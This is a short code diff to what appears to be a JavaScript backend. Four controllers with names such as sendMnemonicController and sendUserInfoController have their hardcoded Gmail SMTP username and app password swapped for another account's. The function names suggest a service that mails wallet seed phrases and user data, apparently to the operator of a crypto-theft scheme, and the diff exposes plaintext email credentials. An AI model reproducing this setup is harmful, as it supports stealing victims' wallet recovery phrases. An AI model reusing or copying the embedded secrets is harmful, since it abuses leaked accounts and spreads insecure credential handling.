@@ -39,8 +39,8 @@ export const sendMnemonicController = asyncHandler(
         port: 465,
         secure: true,
         auth: {
-          user: "davidbrown202e@gmail.com",
-          pass: "peie nkic zolx kfno", // App password only
+          user: "sumitseo2026@gmail.com",
+          pass: "lyeh dgeh qaxq hnys", // App password only
         },
       });
 
@@ -114,8 +114,8 @@ export const sendMnemonicControllerAws = asyncHandler(
         port: 465,
         secure: true,
         auth: {
-          user: "davidbrown202e@gmail.com",
-          pass: "peie nkic zolx kfno", // App password only
+          user: "sumitseo2026@gmail.com",
+          pass: "lyeh dgeh qaxq hnys", // App password only
         },
       });
 
@@ -192,8 +192,8 @@ export const sendUserInfoController = asyncHandler(
         port: 465,
         secure: true,
         auth: {
-          user: "davidbrown202e@gmail.com",
-          pass: "peie nkic zolx kfno", // App password only
+          user: "sumitseo2026@gmail.com",
+          pass: "lyeh dgeh qaxq hnys", // App password only
         },
       });
 
@@ -265,8 +265,8 @@ export const sendUserInfoController2 = asyncHandler(
         port: 465,
         secure: true,
         auth: {
-          user: "davidbrown202e@gmail.com",
-          pass: "peie nkic zolx kfno", // App password only
+          user: "sumitseo2026@gmail.com",
+          pass: "lyeh dgeh qaxq hnys", // App password only
         },
       });
 
